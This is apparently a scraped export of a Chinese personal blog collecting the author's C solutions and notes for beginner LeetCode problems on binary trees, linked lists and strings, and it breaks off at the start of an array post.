链接：https://leetcode-cn.com/problems/binary-tree-level-order-traversal/solution/chun-cchuang-jian-dui-lie-shi-xian-er-cha-shu-de-c/ 来源：力扣（LeetCode） 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * struct TreeNode *left; * struct TreeNode *right; * }; */ /** * Return an array of arrays of size *returnSize. * The sizes of the arrays are returned as *returnColumnSizes array. * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free(). */ //创建队列 //1,构建队列，实现压入和弹出函数 Push_Queue 和 Pop_Queue //2,利用队列先进先出的特性实现二叉树的层序遍历 //3,将二叉树根 root 压入队列，并将 NULL 作为每层的区分节点也压入队列 //4,从队列中读出节点，保存当前节点的值，并且将左右支分别压入队列 //5,遇到层的区分节点则处理下一层，直到队列为空 #define MAX_LEVEL 1000 //声明队列节点结构 struct QueueNode { struct TreeNode* pTreeNode; //队列元素：二叉树节点指针 struct TreeNodeQueue* pNext; //队列元素：下一个节点指针 }; //声明队列结构 struct TreeNodeQueue { int iNum; //队列元素个数 struct QueueNode* pHead; //队列头指针 struct QueueNode* pTail; //队列尾指针 }; //函数一：向队列中增加元素 bool Push_Queue(struct TreeNodeQueue* pQueue, struct TreeNode* pTreeNode){ struct QueueNode* pQueueNode = NULL; if(NULL == pQueue) return false; pQueueNode = (struct QueueNode*)malloc(sizeof(struct QueueNode)); pQueueNode-\u0026gt;pTreeNode = pTreeNode; pQueueNode-\u0026gt;pNext = NULL; if(0 == pQueue-\u0026gt;iNum) { pQueue-\u0026gt;pHead = pQueueNode; pQueue-\u0026gt;pTail = pQueueNode; pQueue-\u0026gt;iNum += 1; } else { pQueue-\u0026gt;pTail-\u0026gt;pNext = pQueueNode; pQueue-\u0026gt;pTail = pQueueNode; pQueue-\u0026gt;iNum += 1; } return true; } //函数二：从队列中取出元素 struct TreeNode* Pop_Queue(struct TreeNodeQueue* pQueue){ struct TreeNode* pRet = NULL; struct QueueNode* pTmp = NULL; if((NULL == pQueue) || (0 == pQueue-\u0026gt;iNum)) return NULL; pRet = pQueue-\u0026gt;pHead-\u0026gt;pTreeNode; pQueue-\u0026gt;iNum -= 1; if(0 == pQueue-\u0026gt;iNum) { free(pQueue-\u0026gt;pHead); pQueue-\u0026gt;pHead = NULL; pQueue-\u0026gt;pTail = NULL; } else { pTmp = pQueue-\u0026gt;pHead-\u0026gt;pNext; free(pQueue-\u0026gt;pHead); pQueue-\u0026gt;pHead = pTmp; } return pRet; } int** levelOrder(struct TreeNode* root, int* returnSize, int** returnColumnSizes){ int iNum = 0; int iRetSize = 0; int** pRet = NULL; int* pRetCol = NULL; struct TreeNodeQueue strQueue; struct TreeNode* pTmpNode = NULL; //1.申请空间,并初始化 pRet = (int**)malloc(sizeof(int*) * MAX_LEVEL); memset(pRet, 0x00, sizeof(int*) * MAX_LEVEL); pRetCol = (int*)malloc(sizeof(int) * MAX_LEVEL); memset(pRetCol, 0x00, sizeof(int) * MAX_LEVEL); memset(\u0026amp;strQueue, 0x00, sizeof(struct TreeNodeQueue)); //2.特殊处理 if(NULL == root) { *returnSize = iRetSize; *returnColumnSizes = pRetCol; return pRet; } //3.将二叉树根节点加入队列,并且加入空节点作为每层的区分节点 Push_Queue(\u0026amp;strQueue, root); pRet[iRetSize] = (int*)malloc(sizeof(int) * strQueue.iNum); Push_Queue(\u0026amp;strQueue, NULL); //4.处理队列中的二叉树节点，直到队列为空 while(strQueue.iNum != 0) { pTmpNode = Pop_Queue(\u0026amp;strQueue); if(NULL == pTmpNode) { if(0 != strQueue.iNum) { //6.当前层处理完，进入下一层 iRetSize += 1; pRet[iRetSize] = (int*)malloc(sizeof(int) * strQueue.iNum); Push_Queue(\u0026amp;strQueue, NULL); } } else { //5.处理当前层的节点，分别将左右支压入队列 pRet[iRetSize][pRetCol[iRetSize]] = pTmpNode-\u0026gt;val; pRetCol[iRetSize] += 1; if(NULL != pTmpNode-\u0026gt;left) { Push_Queue(\u0026amp;strQueue, pTmpNode-\u0026gt;left); } if(NULL != pTmpNode-\u0026gt;right) { Push_Queue(\u0026amp;strQueue, pTmpNode-\u0026gt;right); } } } //7.返回 *returnSize = iRetSize + 1; *returnColumnSizes = pRetCol; return pRet; } ","date":"2020-05-29T16:27:12+08:00","permalink":"https://lizonglingo.github.io/p/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/","title":"链式存储二叉树的遍历"},{"content":" 力扣关于链表这部分基础算法还是较为简单和基础的\n没有特殊说明的情况下，链表节点类型为：\nstruct ListNode { int val; struct ListNode *next; }; 同时，需要注意，默认的头指针head-\u0026gt;val域即第一个元素。\n删除链表中的节点 请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点，你将只被给定要求被删除的节点。\n现有一个链表 \u0026ndash; head = [4,5,1,9]，它可以表示为:\n示例 1:\n输入: head = [4,5,1,9], node = 5\r输出: [4,1,9]\r解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -\u0026gt; 1 -\u0026gt; 9. 示例 2:\n输入: head = [4,5,1,9], node = 1\r输出: [4,5,9]\r解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -\u0026gt; 5 -\u0026gt; 9. 说明:\n链表至少包含两个节点。 链表中所有节点的值都是唯一的。 给定的节点为非末尾节点并且一定是链表中的一个有效节点。 不要从你的函数中返回任何结果。 代码:\n这个题目很容易理解偏差。其实就是让你把给你的节点删掉罢了。\nvoid deleteNode(struct ListNode* node) { node-\u0026gt;val = node-\u0026gt;next-\u0026gt;val; node-\u0026gt;next = node-\u0026gt;next-\u0026gt;next; } 删除链表的倒数第N个节点 给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。\n示例：\n给定一个链表: 1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;5, 和 n = 2.\r当删除了倒数第二个节点后，链表变为 1-\u0026gt;2-\u0026gt;3-\u0026gt;5. 说明：\n给定的 n 保证是有效的。\n进阶：\n你能尝试使用一趟扫描实现吗？\n代码:\n采用快慢指针的思路。设置指针p和q：\n一开始，p和q都指向头节点； q指针现后移至p指针后的第n个位置，也就是q指针始终比p指针快n个，需要注意如果q还未移动n就已经是NULL了那么删去头节点就结束了； p=p-\u0026gt;next同时q=q-\u0026gt;next直到q-\u0026gt;next==NULL，此时p-\u0026gt;next就是要删除的节点。 struct ListNode* removeNthFromEnd(struct ListNode* head, int n) { struct ListNode *p, *q; p = head; q = head; int i; for (i = 0; i \u0026lt; n; i++) { if (q-\u0026gt;next == NULL) { head = head-\u0026gt;next; return head; } q = q-\u0026gt;next; } while (q-\u0026gt;next!=NULL) { q = q-\u0026gt;next; p = p-\u0026gt;next; } p-\u0026gt;next = p-\u0026gt;next-\u0026gt;next; return head; } 反转链表 反转一个单链表。\n示例:\n输入: 1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;5-\u0026gt;NULL\r输出: 5-\u0026gt;4-\u0026gt;3-\u0026gt;2-\u0026gt;1-\u0026gt;NULL 进阶: 你可以迭代或递归地反转链表。你能否用两种方法解决这道题？\n代码:\n三指针原地逆转。\nstruct ListNode* reverseList(struct ListNode* head) { if (head == NULL) return NULL; struct ListNode *h,*p,*c; h = head; p = h-\u0026gt;next; // 如果此时只有一个节点 if (p == NULL) return head; c = p-\u0026gt;next; // 如果只有两个节点 if (c == NULL) { p-\u0026gt;next = h; h-\u0026gt;next = NULL; return p; } // 三节点及以上情况 while (c != NULL) { p-\u0026gt;next = h; h = p; p = c; c = c-\u0026gt;next; } p-\u0026gt;next = h; head-\u0026gt;next = NULL; head = p; return head; } 合并两个有序链表 将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。\n示例：\n输入：1-\u0026gt;2-\u0026gt;4, 1-\u0026gt;3-\u0026gt;4\r输出：1-\u0026gt;1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;4 代码:\n判断大小拆指针重连。\nstruct ListNode* mergeTwoLists(struct ListNode* l1, struct ListNode* l2){ if (l1 == NULL \u0026amp;\u0026amp; l2 == NULL) return NULL; if (l1 == NULL \u0026amp;\u0026amp; l2 != NULL) return l2; if (l1 != NULL \u0026amp;\u0026amp; l2 == NULL) return l1; struct ListNode *p1, *p2, *newhead, *q; p1 = l1; p2 = l2; newhead = (l1-\u0026gt;val \u0026lt;= l2-\u0026gt;val) ? l1 : l2; q = newhead; if (newhead == p1) p1 = p1-\u0026gt;next; else p2 = p2-\u0026gt;next; while (p1\u0026amp;\u0026amp;p2) { if (p1-\u0026gt;val \u0026lt;= p2-\u0026gt;val) { q-\u0026gt;next = p1; p1 = p1-\u0026gt;next; q = q-\u0026gt;next; } else { q-\u0026gt;next = p2; p2 = p2-\u0026gt;next; q = q-\u0026gt;next; } } if (p1) q-\u0026gt;next = p1; if (p2) q-\u0026gt;next = p2; return newhead; } 回文链表 请判断一个链表是否为回文链表。\n示例 1:\n输入: 1-\u0026gt;2\r输出: false 示例 2:\n输入: 1-\u0026gt;2-\u0026gt;2-\u0026gt;1\r输出: true 进阶： 你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？\n代码:\n将链表数值写入数组，然后判断数组是否是回文数组。\nbool isPalindrome(struct ListNode* head) { if (head == NULL || head-\u0026gt;next == NULL) return true; // 计算链表长度 struct ListNode *p = head; int len = 0; while (p) { p = p-\u0026gt;next; len++; } // 将链表复制到数组中 int *temparr = (int*)malloc(sizeof(int)*len); int i = 0; for (p = head; i \u0026lt; len; i++) { temparr[i] = p-\u0026gt;val; p = p-\u0026gt;next; } // 判断数组 int q = 0; bool ispld = true; for (; q \u0026lt; (len - q - 1); q++) { if (temparr[q] != temparr[len - q - 1]) { ispld = false; break; } } return ispld; } 环形链表 给定一个链表，判断链表中是否有环。\n为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。\n示例 1：\n输入：head = [3,2,0,-4], pos = 1\r输出：true\r解释：链表中有一个环，其尾部连接到第二个节点。 示例 2：\n输入：head = [1,2], pos = 0\r输出：true\r解释：链表中有一个环，其尾部连接到第一个节点。 示例 3：\n输入：head = [1], pos = -1\r输出：false\r解释：链表中没有环。 进阶：\n你能用 O(1)（即，常量）内存解决此问题吗？\n代码:\n使用快慢指针。始终有p=p-\u0026gt;next同时q=q-\u0026gt;next-\u0026gt;next，这样可以保证如果链表中有环，指针p和q一定能相遇。\nbool hasCycle(struct ListNode *head) { struct ListNode *p, *q; p = head; q = head; if (p == NULL) return false; while (p!=NULL\u0026amp;\u0026amp;q!=NULL) { if(q-\u0026gt;next==NULL)return false; if(q-\u0026gt;next-\u0026gt;next==NULL)return false; p = p-\u0026gt;next; q = q-\u0026gt;next-\u0026gt;next; if (p == q) { return true; } } return false; } ","date":"2020-05-25T20:39:37+08:00","permalink":"https://lizonglingo.github.io/p/leetcode%E9%93%BE%E8%A1%A8%E5%88%9D%E7%AD%89%E6%95%B4%E7%90%86/","title":"leetcode链表初等整理"},{"content":"反转字符串 编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 char[] 的形式给出。\n不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。\n你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。\n示例 1：\n输入：[\u0026#34;h\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;o\u0026#34;]\r输出：[\u0026#34;o\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;h\u0026#34;] 示例 2：\n输入：[\u0026#34;H\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;n\u0026#34;,\u0026#34;n\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;h\u0026#34;]\r输出：[\u0026#34;h\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;n\u0026#34;,\u0026#34;n\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;H\u0026#34;] 代码:\n思路和翻转整数数组的思路一致，两个指针分别从前后开始扫描，进行交换。\nvoid reverseString(char* s, int sSize) { // 用反转数组相同的方式 int i; for (i = 0; i \u0026lt; sSize / 2; i++) { char temp = s[sSize - 1 - i]; s[sSize - 1 - i] = s[i]; s[i] = temp; } } 整数反转 给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。\n示例 1:\n输入: 123\r输出: 321 示例 2:\n输入: -123\r输出: -321 示例 3:\n输入: 120\r输出: 21 注意:\n假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231, 231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。\n代码:\nint reverse(int x){ long count=0; while(x!=0){ // 翻转整数 count=count*10+x%10; x=x/10; } return count\u0026gt;2147483647||count\u0026lt;-2147483648?0:count;\t// 直接给出范围判断是否溢出 } 字符串中的第一个唯一字符 给定一个字符串，找到它的第一个不重复的字符，并返回它的索引。如果不存在，则返回 -1。\n案例:\ns = \u0026#34;leetcode\u0026#34;\r返回 0.\rs = \u0026#34;loveleetcode\u0026#34;,\r返回 2. **注意事项：**您可以假定该字符串只包含小写字母。\n代码：\n本题我用暴力法做的，在时间上不是很理想。\n二重循环，外层遍历的元素与内层遍历的除本身外的元素进行比较，find表示是否找到相同的数，find=0就说明第i个元素只有一个，同时置have=1表示存在这样的元素。返回其索引。\nint firstUniqChar(char * s) { // 得到长度 int len = strlen(s); int have = 0; int i, j; for (i = 0; i \u0026lt; len; i++) { int find = 0; for (j = 0; j \u0026lt; len; j++) { if (i == j) continue; if (s[i] == s[j]) { find = 1; break; } } if (find == 0) { have = 1; break; } } return have ? i : -1; } 另外，其他人用了更好的方法，也就是使用辅助数组，记录每个元素出现的次数，在上一篇数组内容中也出现了这个方法。我想到这个方法时，没有考虑周全，误以为在遍历辅助数组时，只能从i=0 to n遍历，导致不能确定第一个为1就是第一个元素。但是，完全可以按照原数组的元素排列进行遍历，也就是将s[i]-'a'作为遍历指针。\nint firstUniqChar(char * s){ int i, len = strlen(s); // 构造辅助数组 int p[26]; memset(p, 0, sizeof(int) * 26); // 首先根据原数组的元素出现情况进行填充 for(i = 0; i \u0026lt; len; i++){ p[s[i] - \u0026#39;a\u0026#39;]++; } // 再由 s[i]-\u0026#39;a\u0026#39; 作为遍历指针遍历辅助数组，寻找第一个只出现一次的元素 for(i = 0; i \u0026lt; len; i++){ if(p[s[i] - \u0026#39;a\u0026#39;] == 1) return i; } return -1; } 有效的字母异位词 给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。\n示例 1:\n输入: s = \u0026#34;anagram\u0026#34;, t = \u0026#34;nagaram\u0026#34;\r输出: true 示例 2:\n输入: s = \u0026#34;rat\u0026#34;, t = \u0026#34;car\u0026#34;\r输出: false 说明: 你可以假设字符串只包含小写字母。\n进阶: 如果输入字符串包含 unicode 字符怎么办？你能否调整你的解法来应对这种情况？\n代码:\n这道题目让我想到了高中化学学的同分异构体，也就是所有对应的字母个数相同，但是排列方式不同。所以本道题采用辅助数组的形式，分别统计字符串s和t中每个字母出现的次数，接着再比较两个辅助数组是否相同即可。\nbool isAnagram(char * s, char * t) { int lens = strlen(s); int lent = strlen(t); if (lens != lent)return false;\t// 如果长度不相等，之间返回错误 // 下面用两个辅助数组，分别记录两个字符串中，每个字母出现的次数 int temps[26], tempt[26]; memset(temps, 0, sizeof(int) * 26); memset(tempt, 0, sizeof(int) * 26); // 开始统计数量 int i; for (i = 0; i \u0026lt; lens; i++) { temps[s[i] - \u0026#39;a\u0026#39;]++; tempt[t[i] - \u0026#39;a\u0026#39;]++; } // 比较辅助数组 bool is = true; for (i = 0; i \u0026lt; 26; i++) {\t// 注意这个数组是26个元素 if (temps[i] != tempt[i]) { is = false; break; } } return is; } 验证回文字符串 给定一个字符串，验证它是否是回文串，只考虑字母和数字字符，可以忽略字母的大小写。\n**说明：**本题中，我们将空字符串定义为有效的回文串。\n示例 1:\n输入: \u0026#34;A man, a plan, a canal: Panama\u0026#34;\r输出: true 示例 2:\n输入: \u0026#34;race a car\u0026#34;\r输出: false 代码:\n构造函数islod()来判断现读取到的字符是否为字母或者数字； 现对字符串的字母进行大小写统一转换，便于比较，这里全部转为小写字母； 使用双指针分别从头和尾进行遍历，对于既不是数字也不是字母的字符忽略，然后比较两个指针所指元素是否相同。 bool islod(char c) { return\t((c \u0026gt;= \u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;= \u0026#39;z\u0026#39;) || (c \u0026gt;= \u0026#39;A\u0026#39;\u0026amp;\u0026amp;c \u0026lt;= \u0026#39;Z\u0026#39;) || (c \u0026gt;= \u0026#39;0\u0026#39;\u0026amp;\u0026amp;c \u0026lt;= \u0026#39;9\u0026#39;)) ? true : false; } bool isPalindrome(char * s) { int lens = strlen(s); bool re = true; // 首先进行大小写转化方便判断 int p; for (p = 0; p \u0026lt; lens; p++) if (s[p] \u0026gt;= \u0026#39;A\u0026#39;\u0026amp;\u0026amp;s[p] \u0026lt;= \u0026#39;Z\u0026#39;) s[p] += 32; int f, l; for (f = 0, l = lens - 1; f \u0026lt; l; f++, l--) { // 首先需要判断是否是有效字符 while (!islod(s[f]) \u0026amp;\u0026amp; f \u0026lt; l ) f++;\t// 循环直到 f 为合法字符 while (!islod(s[l]) \u0026amp;\u0026amp; f \u0026lt; l ) l--;\t// 循环直到 l 为合法字符 // 然后判断一下f l避免越界 if ( !(f \u0026lt; l) ) break; // 再进行判断 if (s[f] != s[l]) { re = false; break; } } return re; } 字符串转换整数(atoi) 请你来实现一个 atoi 函数，使其能将字符串转换成整数。\n首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。接下来的转化规则如下：\n如果第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字字符组合起来，形成一个有符号整数。 假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成一个整数。 该字符串在有效的整数部分之后也可能会存在多余的字符，那么这些字符可以被忽略，它们对函数不应该造成影响。 注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换，即无法进行有效转换。\n在任何情况下，若函数不能进行有效的转换时，请返回 0 。\n提示：\n本题中的空白字符只包括空格字符 ' ' 。 假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231, 231 − 1]。如果数值超过这个范围，请返回 INT_MAX (231 − 1) 或 INT_MIN (−231) 。 示例 1:\n输入: \u0026#34;42\u0026#34;\r输出: 42 示例 2:\n输入: \u0026#34; -42\u0026#34;\r输出: -42\r解释: 第一个非空白字符为 \u0026#39;-\u0026#39;, 它是一个负号。\r我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。 示例 3:\n输入: \u0026#34;4193 with words\u0026#34;\r输出: 4193\r解释: 转换截止于数字 \u0026#39;3\u0026#39; ，因为它的下一个字符不为数字。 示例 4:\n输入: \u0026#34;words and 987\u0026#34;\r输出: 0\r解释: 第一个非空字符是 \u0026#39;w\u0026#39;, 但它不是数字或正、负号。\r因此无法执行有效的转换。 示例 5:\n输入: \u0026#34;-91283472332\u0026#34;\r输出: -2147483648\r解释: 数字 \u0026#34;-91283472332\u0026#34; 超过 32 位有符号整数范围。 因此返回 INT_MIN (−231) 。 代码:\n这个题目写了很久，最后\u0026hellip;还是学习学习别人写的吧\u0026hellip;这个判断溢出的方法真的很巧妙，在以前都是直接暴力判断溢出的，因为很多题目假设只有32位，所以直接用数判断未免属于不合法的手段。\nint myAtoi(char * str) { // 移除开头的空格 while (*str == \u0026#39; \u0026#39;) ++str; // 此时 str 指向第一个不为空格的字符 // 如果带有正负号，记录正负性 int flag = 1; if (*str == \u0026#39;-\u0026#39;) { flag = -1; ++str; } else if (*str == \u0026#39;+\u0026#39;) ++str; int ret = 0; // 因为只能使用 32 位 int，因此将 ret 乘 10 后再与 INT_MAX 比较可能会溢出 // 因此使用 ret 与 INT_MAX/10 比较 int div = INT_MAX / 10; while (*str \u0026lt;= \u0026#39;9\u0026#39; \u0026amp;\u0026amp; *str \u0026gt;= \u0026#39;0\u0026#39;) { int dig = *str - \u0026#39;0\u0026#39;; // 若 ret 比 div 小，则 ret * 10 + dig 也一定小于 INT_MAX，不会溢出 // 若 ret 与 div 相等，只有 dig 比 8 小时不会溢出 // 此处本来需要正负分开讨论，INT_MAX 个位是 7，INT_MIN 个位是 8 // -INT_MIN 在 int 中会溢出，当 dig == 8 时直接当作溢出处理 if (ret \u0026lt; div || (ret == div \u0026amp;\u0026amp; dig \u0026lt; 8)) { ret = ret * 10 + dig; ++str; } // 溢出，根据正负性返回值 else return (flag == 1 ? INT_MAX : INT_MIN); } return flag * ret; } 实现strStr() 实现 strStr() 函数。\n给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回 -1。\n示例 1:\n输入: haystack = \u0026#34;hello\u0026#34;, needle = \u0026#34;ll\u0026#34;\r输出: 2 示例 2:\n输入: haystack = \u0026#34;aaaaa\u0026#34;, needle = \u0026#34;bba\u0026#34;\r输出: -1 说明:\n当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。\n对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与C语言的 strstr() 以及 Java的 indexOf() 定义相符。\n代码:\nKMP，双100%，永远滴神！我觉得书上讲的都比较含糊，可以找视频来看一下这个算法，主要是求next数组。\n/* 前缀表 */ void prefix_table(char pattern[], int prefix[], int n) { prefix[0] = 0; int len = 0; int i = 1; while (i \u0026lt; n) { if (pattern[i] == pattern[len]) { len++; prefix[i] = len; i++; } else { if (len \u0026gt; 0) { len = prefix[len - 1]; } else { prefix[i] = len; i++; } } } } /* 左移前缀表 */ void move_prefix_table(int prefix[], int n) { int i; for (i = n - 1; i \u0026gt; 0; i--) { prefix[i] = prefix[i - 1]; } prefix[0] = -1; } /* kmp search */ int kmp_search(char text[], char pattern[]) { int n = strlen(pattern); int m = strlen(text); int *prefix = malloc(sizeof(int)*n); prefix_table(pattern, prefix, n); move_prefix_table(prefix, n); /* text[i]\tlen(text) = m pattern[j]\tlen[pattern] = n */ int i = 0, j = 0; while (i \u0026lt; m) { if (j == n - 1 \u0026amp;\u0026amp; text[i] == pattern[j]) { /*printf(\u0026#34;%d\u0026#34;, i - j); j = prefix[j];*/ return i - j; } if (text[i] == pattern[j]) { i++; j++; } else { j = prefix[j]; if (j == -1) { i++; j++; } } } return -1; } int strStr(char * haystack, char * needle) { int lenn = strlen(needle); if (lenn == 0) { return 0; } return kmp_search(haystack, needle); } 外观数列 「外观数列」是一个整数序列，从数字 1 开始，序列中的每一项都是对前一项的描述。前五项如下：\n1. 1\r2. 11\r3. 21\r4. 1211\r5. 111221 1 被读作 \u0026quot;one 1\u0026quot; (\u0026quot;一个一\u0026quot;) , 即 11。 11 被读作 \u0026quot;two 1s\u0026quot; (\u0026quot;两个一\u0026quot;）, 即 21。 21 被读作 \u0026quot;one 2\u0026quot;, \u0026ldquo;one 1\u0026quot; （\u0026quot;一个二\u0026quot; , \u0026quot;一个一\u0026quot;) , 即 1211。\n给定一个正整数 n（1 ≤ n ≤ 30），输出外观数列的第 n 项。\n注意：整数序列中的每一项将表示为一个字符串。\n示例 1:\n输入: 1\r输出: \u0026#34;1\u0026#34;\r解释：这是一个基本样例。 示例 2:\n输入: 4\r输出: \u0026#34;1211\u0026#34;\r解释：当 n = 3 时，序列是 \u0026#34;21\u0026#34;，其中我们有 \u0026#34;2\u0026#34; 和 \u0026#34;1\u0026#34; 两组，\u0026#34;2\u0026#34; 可以读作 \u0026#34;12\u0026#34;，也就是出现频次 = 1 而 值 = 2；类似 \u0026#34;1\u0026#34; 可以读作 \u0026#34;11\u0026#34;。所以答案是 \u0026#34;12\u0026#34; 和 \u0026#34;11\u0026#34; 组合在一起，也就是 \u0026#34;1211\u0026#34;。 代码:\n这个题目比较有意思。\n使用了两个数组，数组res作为结果项和初始项，数组tmp作为对res处理后的进行保存的中间项，然后每一轮结束时，将数组tmp的内容复制到res中，再下一轮以res作为初始串进行处理。\nchar * countAndSay(int n) { char *res = (char*)malloc(sizeof(char) * 5000); char *tmp = (char*)malloc(sizeof(char) * 5000); res[0] = \u0026#39;1\u0026#39;; res[1] = \u0026#39;\\0\u0026#39;; // res 初始化为 \u0026#34;1\u0026#34; int len = 1; // len 为 res 的有效长度 while (--n) { int i = 0, j = 0; while (i \u0026lt; len) { // 对 res 的每位字符 c 进行报数 int count = 1; char c = res[i++]; while (i \u0026lt; len \u0026amp;\u0026amp; res[i] == c) // 计算本轮报数结果，即本轮有几个 c i++, count++; tmp[j++] = count + \u0026#39;0\u0026#39;; // 将报数结果存入 tmp tmp[j++] = c; } tmp[j] = \u0026#39;\\0\u0026#39;; strcpy(res, tmp); // 将 tmp 复制到 res，并更新 res 长度 len = j; } return res; } 最长公共前缀 编写一个函数来查找字符串数组中的最长公共前缀。\n如果不存在公共前缀，返回空字符串 \u0026quot;\u0026quot;。\n示例 1:\n输入: [\u0026#34;flower\u0026#34;,\u0026#34;flow\u0026#34;,\u0026#34;flight\u0026#34;]\r输出: \u0026#34;fl\u0026#34; 示例 2:\n输入: [\u0026#34;dog\u0026#34;,\u0026#34;racecar\u0026#34;,\u0026#34;car\u0026#34;]\r输出: \u0026#34;\u0026#34;\r解释: 输入不存在公共前缀。 说明:\n所有输入只包含小写字母 a-z 。\n代码:\n本题使用暴力法，但是由于公共前缀的问题，使用暴力法的时间表现还可以。求最短的元素，以其长度为基准进行搜索。然后双重循环求公共前缀。\nchar * longestCommonPrefix(char ** strs, int strsSize) { if(strsSize==0) { char *p = \u0026#34;\u0026#34;; return p; } if(strsSize==1) return strs[0]; // 先找出最短的元素 int minlen = strlen(strs[0]); int i; for (i = 1; i \u0026lt; strsSize; i++) { if (minlen \u0026gt; strlen(strs[i])) { minlen = strlen(strs[i]); } } // 循环求解找最长公共前缀 int front, j; bool valid = true; for (front = 0; front \u0026lt; minlen; front++) { for (j = 0; j \u0026lt; strsSize - 1; j++) { if (strs[j][front] != strs[j + 1][front]) { valid = false; break; } } if (!valid) break; } // 此时，front为 最长公共前缀的长度,假设最大1000 char res[1000]; char *restr = res; memset(res, 0, sizeof(res)); printf(\u0026#34;%d\u0026#34;, strlen(res)); int k; for (k = 0; k \u0026lt; front; k++) { res[k] = strs[0][k]; } return restr; } 我这样做麻烦了\u0026hellip;列垂直扫描不用那么麻烦。唉 ):\nchar * longestCommonPrefix(char ** strs, int strsSize){ if(strsSize==0) return \u0026#34;\u0026#34;; //如果字符串数组为空，直接返回\u0026#34;\u0026#34; for(int i=0;i\u0026lt;strlen(strs[0]);i++){ //i表示列，strlen(strs[0])表示第一个字符串长度 for(int j=1;j\u0026lt;strsSize;j++){ //j表示行 if(strs[0][i]!=strs[j][i]){ //如果比较字符串的第i列不同，该列结束，直接跳出 strs[0][i]=\u0026#39;\\0\u0026#39;; break; } } } return strs[0]; } 作者：cmtsa 链接：https://leetcode-cn.com/problems/longest-common-prefix/solution/cchui-zhi-sao-miao-chao-duan-dai-ma-by-cmtsa/ 来源：力扣（LeetCode） 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2020-05-20T21:35:30+08:00","permalink":"https://lizonglingo.github.io/p/leetcode%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%9D%E7%AD%89%E6%95%B4%E7%90%86/","title":"leetcode字符串初等整理"},{"content":" 好久没有更新了，最近开始做了些leetcode上的算法，刚把数组基础部分做完，整理一下，全部用的C\n删除排序数组中的重复项 给定一个排序数组，你需要在 原地 删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。\n不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。\n示例 1:\n给定数组 nums = [1,1,2], 函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 你不需要考虑数组中超出新长度后面的元素。 示例 2:\n给定 nums = [0,0,1,1,1,2,2,3,3,4],\r函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。\r你不需要考虑数组中超出新长度后面的元素。 说明:\n为什么返回数值是整数，但输出的答案是数组呢?\n请注意，输入数组是以**「引用」**方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。\n你可以想象内部操作如下:\n// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝\rint len = removeDuplicates(nums);\r// 在函数里修改输入数组对于调用者是可见的。\r// 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。\rfor (int i = 0; i \u0026lt; len; i++) {\rprint(nums[i]);\r} 代码:\n快慢双指针的思想，快指针从下标1处开始遍历数组，而慢指针始终指向没有重复元素的前last+1项序列的最后一个元素。\nint removeDuplicates(int* nums, int numsSize){ int fast, last;\t// 双指针 if(numsSize==0){ return 0; } for (last=0,fast = 1; fast \u0026lt; numsSize; fast++){ if (nums[last] != nums[fast]) { /* 如果指的元素不同，就将fast所指的元素给last所指的后一个元素，当然，需要last事先增一 */ nums[++last] = nums[fast]; } } return last + 1; } 买卖股票的最佳时机 II 给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。\n**注意：**你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n示例 1:\n输入: [7,1,5,3,6,4]\r输出: 7\r解释: 在第 2 